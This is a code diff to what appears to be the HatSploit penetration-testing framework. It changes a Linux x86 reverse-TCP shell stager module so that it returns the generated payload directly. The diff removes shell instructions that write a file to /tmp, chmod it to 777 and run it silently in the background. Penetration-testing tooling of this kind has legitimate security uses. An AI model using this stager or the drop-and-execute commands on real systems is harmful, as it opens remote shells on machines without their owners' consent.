@@ -27,10 +27,9 @@
 from core.lib.payload import Payload
 from utils.payload.payload import PayloadGenerator
 from utils.tcp.tcp import TCPClient
-from utils.string.string import StringTools
 
 
-class HatSploitPayload(Payload, PayloadGenerator, TCPClient, StringTools):
+class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
     details = {
         'Category': "stager",
         'Name': "Linux x86 Shell Reverse TCP",
@@ -123,13 +122,4 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient, StringTools):
         self.output_process("Generating payload...")
         payload = self.generate(executable_format, 'x86', shellcode)
 
-        filename = self.random_string()
-
-        instructions = ""
-        instructions += f"cat >/tmp/{filename};"
-        instructions += f"chmod 777 /tmp/{filename};"
-        instructions += f"sh -c '/tmp/{filename}' 2>/dev/null &"
-        instructions += "\n"
-
-        self.payload = payload
-        self.instructions = instructions
+        return payload
